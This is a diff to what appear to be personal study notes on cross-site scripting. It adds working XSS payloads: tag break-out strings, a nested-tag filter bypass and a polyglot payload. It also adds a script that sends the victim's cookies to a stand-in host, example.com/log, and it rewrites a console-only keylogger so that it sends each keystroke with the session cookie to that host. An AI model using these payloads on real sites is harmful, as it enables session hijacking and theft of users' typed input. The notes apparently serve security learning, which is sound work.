@@ -1,10 +1,40 @@
 # XSS (Cross Site Scripting) Attacks
 
+The canonical (but highly annoying) XSS PoC is:
+
+```html
+<script>alert('XSS');</script>
+```
+
+A much less annoying XSS test is to manipulate the `innerHTML` of page elements:
+
+```html
+<script>
+	xssTest
+		= document.querySelector("h1");
+	xssTest.innerHTML = "XSS was here!";
+</script>
+```
+
 ## Tips for Writing JavaScript
 
 JavaScript accepts back-ticks as a type of quotation mark, so we actually have three different marks to work with (single quote, double quote, and back-tick).
 
-It’s worth noting that `<script/>` tags are automatically interpreted as JavaScript these days, so there's no need to add `type="application/javascript"` anymore. *However*, recent web browsers don't seem to reliably execute `<script/>` tags inserted after document load. Using the `onmouseover` or `onclick` attribute seems to work reliably (the `onload` attribute does not, however), though is obviously less useful.
+Sometimes you’ll need to break out of a tag that you’re being inserted into. Various options:
+
+* Use `">` if you’re being inserted into an HTML attribute.
+* Use `</pre>` or `</textarea>` for preformatted blocks and text areas.
+* Use `';` followed by `;//` for direct JavaScript inserts. (Note that it’s only possible to insert `<script/>` tags if the JavaScript you’re abusing is being included from a file, as HTML parsers are greedy about the closing `</script>` tag.)
+
+Most regular expressions and filters are only executed in a single pass. Thus, a regular expression that’s filtering out `<script>` and `</script>` tags can be circumvented by using `<s<script>cript>` and `</s</script>cript>`. That said, this trick doesn’t work for regular expressions that are removing single characters (for example, `<` and `>`).
+
+You can also use the `onload` attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (`"`) and *leave off* the trialing `"` of the `onload` attribute in order for everything to work properly.
+
+There’s also “polygot” strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe’s example) produces an “XSS” alert:
+
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+```
 
 ## Filter Evasion
 
@@ -52,21 +82,33 @@ Note, however, that JavaScript loaded in an `<iframe/>` won’t have access to t
 
 ### Accessing Browser Cookies
 
-Cookies can be accessed in JavaScript via `document.cookie`.
+```html
+<script>
+	fetch(
+		'https://example.com/log'
+			+ '?cookie='
+			+ btoa(document.cookie)
+	);
+</script>
+```
 
 ### Keylogging
 
 ```html
-<script type="text/javascript">
-	let l = "";  
-	document.onkeypress = function (e) {
-		l += e.key;
-		console.log(l);
+<script>
+	document.onkeypress = function(e) {
+		fetch(
+			'https://example.com/log'
+				+ '?cookie='
+				+ btoa(document.cookie)
+				+ '&keypress='
+				+ btoa(e.key)
+		);
 	}
 </script>
 ```
 
-This only logs to the browser console though; a real keylogger would send this information to an external server or some-such.
+Adding the user’s session cookie here allows us to tell whose keystrokes are whose!
 
 ### Port Scanning
 
@@ -77,6 +119,8 @@ This only logs to the browser console though; a real keylogger would send this i
 You can access elements of the DOM using `document.getElementById("element-id")` or `document.querySelector("#element-id")`. The `querySelector()` method is a bit more flexible (you can use CSS-style selectors here) and should probably be preferred.
 
 To get/set the content of an element, use the `innerHTML` method (to insert HTML directly into the DOM), or alternately `innerText` or `textContent` to set element text *only*.
+
+Note that `<script/>` tags inserted by setting an element’s `innerHTML` are *not* executed, however!
 
 ## References
 
